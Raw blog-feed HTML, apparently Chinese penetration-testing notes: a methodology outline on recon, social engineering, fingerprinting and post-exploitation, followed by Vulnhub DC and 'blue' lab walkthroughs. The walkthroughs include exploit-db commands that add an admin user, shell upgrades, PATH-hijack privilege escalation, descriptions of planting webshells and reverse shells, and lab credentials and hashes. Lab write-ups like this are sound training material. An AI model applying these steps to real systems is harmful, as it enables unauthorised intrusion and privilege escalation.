href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><blockquote><p>从各第三方历史漏洞库中查找目标曾经泄露的 各种敏感账号密码 [ 国内目标很好使？ ]</p></blockquote><h2 id="技术文档-x2F-wiki-x2F-知识库"><a href="#技术文档-x2F-wiki-x2F-知识库" class="headerlink" title="技术文档 &#x2F; wiki &#x2F;知识库"></a>技术文档 &#x2F; wiki &#x2F;知识库</h2><p>目标自己对外提供的各种文档里泄露的各种账号密码及其它敏感信息</p><ul><li><p>官网</p></li><li><p><a href="https://www.yuque.com/dashboard">工作台 · 语雀</a></p></li><li><p>百度文库：<a href="https://wenku.baidu.com/">https://wenku.baidu.com</a></p><p>原创力文档：<a href="https://max.book118.com/">https://max.book118.com</a></p><p>凌风云：<a href="https://wenku.lingfengyun.com/">https://wenku.lingfengyun.com</a></p></li></ul><h2 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h2><h3 id="打入目标内部"><a href="#打入目标内部" class="headerlink" title="打入目标内部"></a>打入目标内部</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加入内部QQ群 / 微信群 / 钉钉群 等</span><br><span class="line">社工内部人员</span><br></pre></td></tr></table></figure><h3 id="个人信息使用"><a href="#个人信息使用" class="headerlink" title="个人信息使用"></a>个人信息使用</h3><ul><li><p>将前面收集到的姓名，邮箱，手机号等个人信息放入社工库查询</p></li><li><p><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p><blockquote><p>通过搜索引擎、PGP服务器以及SHODAN数据库收集用户的email，子域名，主机，雇员名，开放端口和banner信息。</p></blockquote></li><li><p>生成社工字典，进行口令爆破</p><p><a href="https://github.com/zgjx6/SocialEngineeringDictionaryGenerator">https://github.com/zgjx6/SocialEngineeringDictionaryGenerator</a></p></li></ul><h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/n0tr00t/Sreg</span><br><span class="line">reg007</span><br></pre></td></tr></table></figure><h1 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h1><h2 id="为什么-2"><a href="#为什么-2" class="headerlink" title="为什么"></a>为什么</h2><ul><li><p><strong>筛选出最可能有漏洞的点</strong></p></li><li><p><strong>识别waf</strong></p></li></ul><h2 id="指纹识别-1"><a href="#指纹识别-1" class="headerlink" title="指纹识别"></a>指纹识别</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h3 id="Web应用框架"><a href="#Web应用框架" class="headerlink" title="Web应用框架"></a>Web应用框架</h3><h4 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h4><ul><li><p><a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></p><p><img src="/../images/image-20230511175807888-1685533751889.png" alt="image-20230511175807888"></p></li><li><p><a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a> </p><p><img src="/../images/image-20230510175457574-1685533751889.png" alt="image-20230510175457574"></p></li><li><p><a href="https://github.com/broken5/bscan">https://github.com/broken5/bscan</a></p><p><img src="/../images/image-20230510175516456-1685533751889.png" alt="image-20230510175516456"></p></li><li><p><a href="https://github.com/EASY233/Finger">https://github.com/EASY233/Finger</a></p><p><img src="/../images/image-20230510175534390-1685533751889.png" alt="image-20230510175534390"></p></li><li><p><a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p><p><img src="/../images/image-20230511110926338-1685533751889.png" alt="image-20230511110926338"></p></li></ul><h4 id="在线网站-1"><a href="#在线网站-1" class="headerlink" title="在线网站"></a>在线网站</h4><ul><li><p><a href="https://fp.shuziguanxing.com/#/">指纹收录平台</a></p></li><li><p><a href="https://hackertarget.com/whatweb-scan/">https://hackertarget.com/whatweb-scan/</a></p></li><li><p><a href="http://www.yunsee.cn/">云悉互联网WEB资产在线梳理|在线CMS指纹识别平台 - 云悉安全平台</a>（要企业注册）</p></li></ul><h4 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h4><p>Wappalyzer</p><h3 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h3><ul><li><p>查看返回包有无WAF字样</p><p><img src="/../images/image-20230511233014884-1685533751889.png" alt="image-20230511233014884"></p></li><li><p><a href="https://github.com/EnableSecurity/wafw00f">WAFW00F </a></p></li><li><p>查看拦截页面信息</p><blockquote><p>通过一些明显的注入来触发waf</p></blockquote><p><a href="https://cloud.tencent.com/developer/beta/article/1872310">83个Waf拦截页面-腾讯云开发者社区-腾讯云</a>  （5年前）</p><p><a href="https://mp.weixin.qq.com/s/8F060FU9g_78z57UKS-JsQ">30几款常见WAF的拦截页整理</a>   （2021年）</p></li></ul><h3 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h3><p><a href="https://github.com/cnrstar/anti-honeypot">https://github.com/cnrstar/anti-honeypot</a></p><p><a href="https://send-safe-honeypot-hunter.apponic.com/">https://send-safe-honeypot-hunter.apponic.com/</a></p><h1 id="漏洞探测与利用"><a href="#漏洞探测与利用" class="headerlink" title="漏洞探测与利用"></a>漏洞探测与利用</h1><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><p>经过信息收集得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web服务 （架构，中间件，目录结构）</span><br><span class="line">端口服务</span><br><span class="line">敏感信息 （敏感文件，社工信息）</span><br><span class="line">重点攻击对象</span><br><span class="line">站点是否存在waf</span><br></pre></td></tr></table></figure><p>接下来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">漏扫</span><br><span class="line">手工</span><br><span class="line">绕waf</span><br><span class="line">代码审计</span><br></pre></td></tr></table></figure><h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统漏洞 </span><br><span class="line">web漏洞 </span><br><span class="line">中间件漏洞 </span><br><span class="line">端口服务漏洞 </span><br><span class="line">业务逻辑漏洞</span><br><span class="line">通信安全</span><br></pre></td></tr></table></figure><p>可以参照漏洞checklist来进行检测。</p><p><strong>红队：重点关注能<code>getshell</code>的漏洞</strong></p><h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><ul><li><p>CTF知识</p></li><li><p><a href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Java反序列化数据绕WAF之加大量脏数据</a></p></li><li><p>waf绕过学习</p></li></ul><h1 id="待做"><a href="#待做" class="headerlink" title="待做"></a>待做</h1><blockquote><p>把上面的几个步骤，工具串起来，行成快速信息收集，快速探测打点，最好写个贯穿流程的工具调用的脚本。</p></blockquote><p>参考：<a href="https://www.se7ensec.cn/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/">https://www.se7ensec.cn/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/</a></p><h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><p><img src="/../images/image-20230510184801834-1685533751889.png" alt="image-20230510184801834"></p><p>实操过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域信息收集</span><br><span class="line">linux提权</span><br><span class="line">代理穿透（socket5，frp，re_George，proxifer）</span><br><span class="line">文件传输</span><br><span class="line">简单免杀</span><br><span class="line">mimikatz</span><br><span class="line">ipc$（使用，权限问题）</span><br><span class="line">pth哈希传递</span><br><span class="line">msf使用</span><br></pre></td></tr></table></figure><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内网搜集/探测 =&gt;  免杀提权[非必须] =&gt; 抓取登录凭证 =&gt; （跨）平台横向 =&gt; 入口维持 =&gt; 数据回传 =&gt; 定期权限维护</span><br></pre></td></tr></table></figure><p><a href="https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/">域渗透一条龙手册</a></p><h1 id="产出报告"><a href="#产出报告" class="headerlink" title="产出报告"></a>产出报告</h1><p><a href="https://www.anquanke.com/post/id/215031#h3-5">如何编写一份专业的渗透测试报告-安全客 - 安全资讯平台</a></p><p><a href="https://github.com/awake1t/HackReport/tree/main/01-%E6%8A%A5%E5%91%8A%E6%A8%A1%E6%9D%BF">HackReport&#x2F;01-报告模板 at main · awake1t&#x2F;HackReport</a></p><p><strong>修复建议–渗透测试修复建议总结.pdf</strong></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.gm7.org/">Introduction </a></p><p><a href="https://gitbook.se7ensec.cn/#duan-kou-sao-miao">在线工具 - 肾透测试中心</a></p><p><a href="https://gitbook.se7ensec.cn/hong-dui-zuo-zhan-shou-ce#liu-cheng-jian-yao-shuo-ming">红队作战手册 - 肾透测试中心</a></p><p><a href="https://github.com/bin-maker/BYPASS-CDN/">https://github.com/bin-maker/BYPASS-CDN/</a></p><p><a href="https://www.secpulse.com/archives/194410.html">https://www.secpulse.com/archives/194410.html</a></p><p><a href="https://wiki.wgpsec.org/knowledge/">狼组安全团队公开知识库</a></p><p><a href="https://www.wangan.com/p/7fy7fy135d85fec8">https://www.wangan.com/p/7fy7fy135d85fec8</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--DC系列</title>
      <link href="/2023/06/01/Vulnhub-DC%E7%B3%BB%E5%88%97/"/>
      <url>/2023/06/01/Vulnhub-DC%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo netdiscover 192.168.174.0/24</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223133100570-1686283446321.png" alt="image-20230223133100570"></p><p><img src="/../images/image-20230223133203500-1686283446321.png" alt="image-20230223133203500"></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="/../images/image-20230223131655833-1686283446321.png" alt="image-20230223131655833"></p><h4 id="查看网站"><a href="#查看网站" class="headerlink" title="查看网站"></a>查看网站</h4><p><img src="/../images/image-20230223133357605-1686283446321.png" alt="image-20230223133357605"></p><p>只有注册，登录，找回密码功能（这里用sqlmap没有成功）</p><p>很容易知道其是Drupal系统。</p><h4 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h4><p><img src="/../images/image-20230223133730288-1686283446321.png" alt="image-20230223133730288"></p><p>这里优先使用日期较新，等级为优秀的exp（也可以通过收集到的系统版本寻找日期）</p><p><img src="/../images/image-20230223133945118-1686283446321.png" alt="image-20230223133945118"></p><p>发现成功了。</p><h4 id="获得shell后的信息收集"><a href="#获得shell后的信息收集" class="headerlink" title="获得shell后的信息收集"></a>获得shell后的信息收集</h4><p><img src="/../images/image-20230223134100934-1686283446322.png" alt="image-20230223134100934"></p><p>网上查找可知Drupal的配置文件在<code> /sites/default/settings.php</code>,读取后得到flag2和数据库配置信息</p><p><img src="/../images/1962254-20200713224317160-859515027-1686283446322.png" alt="img"></p><p>连接数据库，需要先将shell切换为交互式</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223134424820-1686283446322.png" alt="image-20230223134424820"></p><p>连接后，查询用户表收集管理员账户信息。</p><p><img src="/../images/image-20230223130117676-1686283446322.png" alt="image-20230223130117676"></p><p>可以看到这里admin的密码是加密了的。这里有三种思路</p><ul><li><p>暴力破解</p><blockquote><p>使用john失败了。</p></blockquote><p><img src="/../images/image-20230223135625792-1686283446323.png" alt="image-20230223135625792"></p></li><li><p>修改密码</p><blockquote><p>需要找到对应的加密脚本。</p></blockquote><p><img src="/../images/image-20230223135430041-1686283446323.png" alt="image-20230223135430041"></p><p><img src="/../images/image-20230223130607081-1686283446323.png" alt="image-20230223130607081"></p><p><img src="/../images/image-20230223131033472-1686283446323.png" alt="image-20230223131033472"></p></li><li><p>增加一名用户（管理员权限）</p><p>使用<a href="https://blog.csdn.net/whatday/article/details/102806149">SearchSploit</a>查找是否有对应的脚本</p><p><img src="/../images/image-20230223142047059-1686283446323.png" alt="image-20230223142047059"></p><p><img src="/../images/image-20230223142453365-1686283446323.png" alt="image-20230223142453365"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2  /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.174.142/ -u admin1 -p 12345</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223142640254-1686283446323.png" alt="image-20230223142640254"></p><p><img src="/../images/image-20230223142651974-1686283446323.png" alt="image-20230223142651974"></p></li></ul><h3 id="登录后"><a href="#登录后" class="headerlink" title="登录后"></a>登录后</h3><p><img src="/../images/image-20230223131339443-1686283446323.png" alt="image-20230223131339443"></p><p><img src="/../images/image-20230223131415615-1686283446323.png" alt="image-20230223131415615"></p><p><img src="/../images/image-20230223131557531-1686283446323.png" alt="image-20230223131557531"></p><p><img src="/../images/image-20230223131846299-1686283446324.png" alt="image-20230223131846299"></p><p>尝试提权</p><p><img src="/../images/image-20230223131936343-1686283446324.png" alt="image-20230223131936343"></p><p><img src="/../images/image-20230223131903800-1686283446324.png" alt="image-20230223131903800"></p><p><img src="/../images/image-20230223131922331-1686283446324.png" alt="image-20230223131922331"></p><p><img src="/../images/image-20230223132056437-1686283446324.png" alt="image-20230223132056437"></p><p><img src="/../images/image-20230223132116100-1686283446324.png" alt="image-20230223132116100"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223132610089-1686283446324.png" alt="image-20230223132610089"></p><p>破解成功后登录flag4用户</p><p><img src="/../images/image-20230223132741851-1686283446324.png" alt="image-20230223132741851"></p><p><img src="/../images/image-20230223132857455-1686283446324.png" alt="image-20230223132857455"></p><p>仍然使用上面的find提权</p><p><img src="/../images/image-20230223132915683-1686283446324.png" alt="image-20230223132915683"></p><h2 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h2><p><a href="https://cloud.tencent.com/developer/article/1801074">https://cloud.tencent.com/developer/article/1801074</a></p><ul><li>ip重定向，需要添加host记录</li><li>cewl密码字典生成，密码爆破</li><li>7744端口的ssh爆破</li><li>rbash限制</li><li>git提权</li></ul><h2 id="DC3"><a href="#DC3" class="headerlink" title="DC3"></a>DC3</h2><p><a href="https://blog.csdn.net/bwt_D/article/details/121291921">https://blog.csdn.net/bwt_D/article/details/121291921</a></p><ul><li>信息收集：得到网站CMS，使用对应版本漏洞exp爆库</li><li>john密码哈希爆破</li><li>后台任意文件上传</li><li>内核提权</li></ul><h2 id="DC4"><a href="#DC4" class="headerlink" title="DC4"></a>DC4</h2><p><a href="https://blog.csdn.net/weixin_44288604/article/details/108018008">https://blog.csdn.net/weixin_44288604/article/details/108018008</a></p><ul><li>用户登录无防护爆破</li><li>rce</li><li>ssh爆破</li><li>信息收集：备份文件，邮件（泄露用户密码）</li><li>teehee提权</li></ul><p><img src="/../images/image-20230224161511140-1686283446324.png" alt="image-20230224161511140"></p><h2 id="DC5"><a href="#DC5" class="headerlink" title="DC5"></a>DC5</h2><p><a href="https://www.freebuf.com/sectool/259277.html">https://www.freebuf.com/sectool/259277.html</a></p><ul><li>日志包含getshell</li><li>screen提权</li></ul><p>端口扫描</p><img src="../../../typora img/image-20230224202703382.png" alt="image-20230224202703382" style="zoom: 80%;" /><p>通过contact提交后，页面返回的页脚不同判断出后端有include函数包含了页脚文件。</p><p><img src="/../images/image-20230224204544733-1686283446324.png" alt="image-20230224204544733"></p><p><img src="/../images/image-20230224204559624-1686283446325.png" alt="image-20230224204559624"></p><p>使用burp爆破参数</p><p><img src="/../images/image-20230224204633133-1686283446325.png" alt="image-20230224204633133"></p><img src="../../../typora img/image-20230224204657204.png" alt="image-20230224204657204" style="zoom:80%;" /><p>文件包含getshell</p><p>因为网站没有文件上传功能，所以可以考虑包含日志文件&#x2F;session文件，或者与phpinfo界面连用。</p><p>这里选择包含日志文件</p><h2 id="DC6"><a href="#DC6" class="headerlink" title="DC6"></a>DC6</h2><p><a href="https://blog.csdn.net/weixin_45996361/article/details/123431118">https://blog.csdn.net/weixin_45996361/article/details/123431118</a></p><ul><li>用户密码爆破（字典为DC2的）</li><li>wordpress插件activity monitor提供了ping命令，对用户输入无限制导致rce</li><li>邮件密码泄露</li><li>sudo提权</li><li>nmap提权</li></ul><p><img src="/../images/image-20230225172831079-1686283446325.png" alt="image-20230225172831079"></p><p><img src="/../images/image-20230225202530004-1686283446325.png" alt="image-20230225202530004"></p><p><img src="/../images/image-20230225202604851-1686283446325.png" alt="image-20230225202604851"></p><p><img src="/../images/image-20230225202617319-1686283446325.png" alt="image-20230225202617319"></p><p><img src="/../images/image-20230225202517080-1686283446325.png" alt="image-20230225202517080"></p><p><img src="/../images/image-20230225202502557-1686283446325.png" alt="image-20230225202502557"></p><h2 id="DC7"><a href="#DC7" class="headerlink" title="DC7"></a>DC7</h2><ul><li><p>端口：22,80</p></li><li><p>信息收集：github源码泄露</p><p><img src="/../images/image-20230225211326780-1686283446325.png" alt="image-20230225211326780"></p><img src="../../../typora img/image-20230225211258444.png" alt="image-20230225211258444" style="zoom:80%;" /><p><img src="/../images/image-20230225211553018-1686283446325.png" alt="image-20230225211553018"></p><p>这个账户测试后可以连接ssh</p></li><li><p>ssh连接后信息收集</p><p>有邮件</p><p><img src="/../images/image-20230225211951236-1686283446325.png" alt="image-20230225211951236"></p><p><img src="/../images/image-20230225211719078-1686283446326.png" alt="image-20230225211719078"></p><p>发现都是以下信息，并且每隔一段时间都有<code>You have new mail</code>提示，可以猜测出这是一个定时脚本</p><p><img src="/../images/image-20230225211729539-1686283446326.png" alt="image-20230225211729539"></p><p><img src="/../images/image-20230225211814513-1686283446326.png" alt="image-20230225211814513"></p><p>​</p></li></ul><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ cat /opt/scripts/backups.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line">cd /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br></pre></td></tr></table></figure><p>drush是drupal的命令，可以修改admin密码 ，不知道为什么在网站目录下才可以</p><p>gpg是公钥加密算法，没找到公钥，所以无法解密，否则可以解密重新导入sql文件</p><p><code>mysql -udc7user -pMdR3xOgB7#dW Staff &lt; /home/dc7user/backups/website.sql;</code></p><ul><li><p>提权</p><p>​通过修改admin密码登录后台，可以编辑博客或者页面。那么直接选择编辑页面写入一个木马。但是需要先安装PHP模块。</p><p>​木马写入后，获得www-data用户权限</p><p>​<img src="/../images/image-20230225225209155-1686283446326.png" alt="image-20230225225209155"></p><p>从定时脚本所属的用户和用户组入手，用户组为www-data权限为rwx：说明www</p><p>-data用户可以对其进行读写执行，拥有者为root：说明其运行时的权限为root。所以我们向其写入反弹shell，等待其执行就可以获得root权限。</p></li></ul><h2 id="DC8"><a href="#DC8" class="headerlink" title="DC8"></a>DC8</h2><p><a href="https://blog.csdn.net/q90375412/article/details/127351747">https://blog.csdn.net/q90375412/article/details/127351747</a></p><ul><li>sql注入（sqlmap）</li><li>john破解密码</li><li>后台模板getshell</li><li>exim4提权</li></ul><h2 id="DC9"><a href="#DC9" class="headerlink" title="DC9"></a>DC9</h2><p><a href="https://blog.csdn.net/m0_65712192/article/details/129250059">https://blog.csdn.net/m0_65712192/article/details/129250059</a></p><p><img src="/../images/image-20230309113640488-1686283446326.png" alt="image-20230309113640488"></p><p>可以发现ssh服务是filtered的</p><p><img src="/../images/image-20230309115117489-1686283446326.png" alt="image-20230309115117489"></p><p><img src="/../images/image-20230309115144629-1686283446326.png" alt="image-20230309115144629"></p><p><img src="/../images/image-20230309121325288-1686283446326.png" alt="image-20230309121325288"></p><p><img src="/../images/image-20230309121309508-1686283446326.png" alt="image-20230309121309508"></p><p><img src="/../images/image-20230309121245679-1686283446327.png" alt="image-20230309121245679"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--blue系列</title>
      <link href="/2023/06/01/Vulnhub-blue%E7%B3%BB%E5%88%97/"/>
      <url>/2023/06/01/Vulnhub-blue%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><img src="../../../typora img/image-20230305123445338.png" alt="image-20230305123445338" style="zoom:80%;" /><p><img src="/../images/image-20230305130206056-1686283466992.png" alt="image-20230305130206056"></p><p><img src="/../images/image-20230305130221501-1686283466992.png" alt="image-20230305130221501"></p><p>secret.zip没有破解出来。</p><p>dirseach目录扫描结果</p><p><img src="/../images/image-20230305130651336-1686283466992.png" alt="image-20230305130651336"></p><p>访问robots.txt中的网址</p><p><img src="/../images/image-20230305130727097-1686283466992.png" alt="image-20230305130727097"></p><p>歌词连在一起MD5为ssh密码，没成功。</p><p>另一个网站为&#x2F;etc&#x2F;dripispowerful.html，猜测有文件包含，根据上面的目录扫描只有一个index.php，参数尝试压缩包里的focus  on “drip”。</p><p>尝试访问index.php?drip&#x3D;&#x2F;etc&#x2F;dripispowerful.html，获得密码和两个用户名</p><p><img src="/../images/image-20230305131636950-1686283466992.png" alt="image-20230305131636950"></p><p>ssh登录</p><p><img src="/../images/image-20230305132010055-1686283466992.png" alt="image-20230305132010055"></p><p>提权（不会，看wp的）</p><p><img src="/../images/image-20230305133355153-1686283466992.png" alt="image-20230305133355153"></p><p>polkit提权<a href="https://github.com/Almorabea/Polkit-exploit">https://github.com/Almorabea/Polkit-exploit</a></p><p><img src="/../images/image-20230305133346301-1686283466992.png" alt="image-20230305133346301"></p><p><img src="/../images/image-20230305133331628-1686283466992.png" alt="image-20230305133331628"></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><ul><li>ftp匿名登录</li><li>wordpress用户爆破，后台getshell</li><li>ssh密钥登录</li><li>nmap提权</li></ul><p><img src="/../images/image-20230304120228644-1686283466993.png" alt="image-20230304120228644"></p><p><img src="/../images/image-20230304120308755-1686283466993.png" alt="image-20230304120308755"></p><p>ftp存在匿名登录，经过验证发现ftp上的secret.jpg无隐写。</p><p><img src="/../images/image-20230304120324693-1686283466993.png" alt="image-20230304120324693"></p><p><img src="/../images/image-20230304120358152-1686283466993.png" alt="image-20230304120358152"></p><p>wpscan用户枚举</p><p><img src="/../images/image-20230304121310981-1686283466993.png" alt="image-20230304121310981"></p><p>进行密码爆破</p><p><img src="/../images/image-20230304122015951-1686283466993.png" alt="image-20230304122015951"></p><p>访问后台时跳转，添加host记录</p><p><img src="/../images/image-20230304121229221-1686283466993.png" alt="image-20230304121229221"></p><p>进入后台</p><p>在主题的404文件中加入一句话木马，访问该404文件，传入反弹shell</p><p><img src="/../images/image-20230304125406319-1686283466993.png" alt="image-20230304125406319"></p><p><img src="/../images/image-20230304125413838-1686283466993.png" alt="image-20230304125413838"></p><p><img src="/../images/image-20230304125353482-1686283466993.png" alt="image-20230304125353482"></p><p>进入家目录看看</p><p><img src="/../images/image-20230304125605846-1686283466993.png" alt="image-20230304125605846"></p><p>无权限，尝试提权失败</p><p>但是还存在ssh密钥，我们可以将ssh私钥下载到本地，通过ssh登录到freddie用户</p><p>使用python在.ssh目录下开一个简易服务器供本地下载文件。</p><p><img src="/../images/image-20230304131800088-1686283466993.png" alt="image-20230304131800088"></p><p>本地下载下来后，需要将id_rsa改为只有400权限才可以使用</p><p><img src="/../images/image-20230304132002887-1686283466993.png" alt="image-20230304132002887"></p><p><img src="/../images/image-20230304132104344-1686283466993.png" alt="image-20230304132104344"></p><p><img src="/../images/image-20230304132257002-1686283466993.png" alt="image-20230304132257002"></p><p><img src="/../images/image-20230304132307798-1686283466993.png" alt="image-20230304132307798"></p><p><img src="/../images/image-20230304132242555-1686283466993.png" alt="image-20230304132242555"></p><p>读取&#x2F;root&#x2F;root.txt获得第二个flag·</p><p><img src="/../images/image-20230304132345766-1686283466993.png" alt="image-20230304132345766"></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><ul><li>ssh日志包含getshell</li><li>ssh密钥登录</li><li>命令劫持提权</li></ul><p><img src="/../images/image-20230304141715650-1686283466994.png" alt="image-20230304141715650"></p><p><img src="/../images/image-20230304141957453-1686283466994.png" alt="image-20230304141957453"></p><p>几个网站都是ABAB。。</p><p>wp-admin目录只有一个readme</p><p><img src="/../images/image-20230304141834709-1686283466994.png" alt="image-20230304141834709"></p><p>恶作剧😡</p><p>回头看namp的默认脚本的扫描，可以看到robots.txt中禁止了一个&#x2F;eventadmins，访问</p><p><img src="/../images/image-20230304142524510-1686283466994.png" alt="image-20230304142524510"></p><p>再访问提示ctrl+a发现</p><p><img src="/../images/image-20230304142655946-1686283466994.png" alt="image-20230304142655946"></p><p><img src="/../images/image-20230304142745118-1686283466994.png" alt="image-20230304142745118"></p><p>再访问</p><p><img src="/../images/image-20230304142923226-1686283466994.png" alt="image-20230304142923226"></p><p>一开始想的是用九头蛇进行爆破，但是用户只知道root。</p><p>后面发现不行，想到日志的用途，尝试进行ssh日志包含getshell。</p><p>因为日志中会记录ssh连接的用户名</p><p><img src="/../images/image-20230304165054436-1686283466994.png" alt="image-20230304165054436"></p><p>所以</p><p><img src="/../images/image-20230304165131376-1686283466994.png" alt="image-20230304165131376"></p><p>反弹shell</p><p><img src="/../images/image-20230304165152817-1686283466994.png" alt="image-20230304165152817"></p><p><img src="/../images/image-20230304165204015-1686283466994.png" alt="image-20230304165204015"></p><p>这里和上一个靶机一样，存在另一个用户robertj，并且www-data无法提权</p><p>按照上一个的思路查看.ssh目录，发现为空</p><p><img src="/../images/image-20230304165345630-1686283466994.png" alt="image-20230304165345630"></p><p>选择直接生成ssh密钥</p><img src="../../../typora img/image-20230304175028256.png" alt="image-20230304175028256" style="zoom:80%;" /><p>查看ssh配置文件：只允许密钥验证方式连接，并且用来验证的公钥为authorized_keys</p><p><img src="/../images/image-20230304171108734-1686283466994.png" alt="image-20230304171108734"></p><p>所以需要将公钥id_rsa.pub改为authorized_keys</p><p>然后用python在靶机上开一个http服务器，kali使用wget命令下载私钥，并修改私钥权限，最后ssh登录</p><p><img src="/../images/image-20230304175249187-1686283466994.png" alt="image-20230304175249187"></p><p>提权</p><p><img src="/../images/image-20230304174502247-1686283466994.png" alt="image-20230304174502247"></p><p>一开始想用strings查看的，但是没有安装，那就直接用一下看看</p><p><img src="/../images/image-20230304174629368-1686283466994.png" alt="image-20230304174629368"></p><p>可以知道这个命令实质上是执行了</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip address</span><br><span class="line">cat /etc/hosts</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>那么我们选一个进行构造即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; uname</span><br><span class="line">chmod 777 uname </span><br><span class="line">export PATH=/home/robertj:$PATH</span><br></pre></td></tr></table></figure><p>然后执行getinfo即可</p><p><img src="/../images/image-20230304174854741-1686283466995.png" alt="image-20230304174854741"></p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><ul><li>misc获得人员信息</li><li>ftp爆破</li><li>ftp+sync服务，导致可以通过ftp服务器操作网站服务器目录</li><li>ssh密钥登录</li><li>命令劫持提权</li></ul><p><img src="/../images/image-20230304191909931-1686283466995.png" alt="image-20230304191909931"></p><p>网站注释解码，访问另一个网站，brainfuck解码，二维码扫描最后得到如下</p><p><img src="/../images/image-20230304204625662-1686283466995.png" alt="image-20230304204625662"></p><p>收集到了网站技术人员的名字，可以尝试爆破ftp和ssh服务。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">luther</span><br><span class="line">gary</span><br><span class="line">hubert</span><br><span class="line">clark</span><br></pre></td></tr></table></figure><p>ssh无果</p><p>ftp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login: luther   password: mypics</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230304210341290-1686283466995.png" alt="image-20230304210341290"></p><p><img 